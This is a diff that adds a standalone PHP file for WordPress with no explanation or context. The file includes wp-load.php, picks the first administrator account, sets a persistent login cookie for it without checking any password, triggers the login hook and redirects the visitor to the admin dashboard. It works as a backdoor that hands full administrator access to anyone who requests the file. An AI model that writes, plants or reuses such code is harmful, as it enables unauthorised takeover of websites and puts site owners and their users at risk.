@@ -1,0 +1,36 @@
+<?php
+
+$mr = $_SERVER['DOCUMENT_ROOT'];
+@chdir($mr);
+
+if (file_exists('wp-load.php')) {
+    include 'wp-load.php';
+
+    $admin_query = new WP_User_Query([
+        'role'   => 'Administrator',
+        'number' => 1,
+        'fields' => 'ID'
+    ]);
+    
+    $admins = $admin_query->get_results();
+
+    if (!empty($admins)) {
+        $admin_id = $admins[0];
+        $user = get_user_by('id', $admin_id);
+        wp_clear_auth_cookie();
+        wp_set_current_user($admin_id, $user->user_login);
+        wp_set_auth_cookie($admin_id, true);
+
+        do_action('wp_login', $user->user_login, $user);
+        echo '<html><head><title>Loading...</title>';
+        echo '<meta http-equiv="refresh" content="0;url=' . admin_url() . '">';
+        echo '</head><body>';
+        echo '<script type="text/javascript">window.location.href="' . admin_url() . '";</script>';
+        echo 'Redirecting to Dashboard...</body></html>';
+        exit;
+    } else {
+        die('Error: No admin user found in database.');
+    }
+} else {
+    die('Error: wp-load.php not found. Check your directory path.');
+}
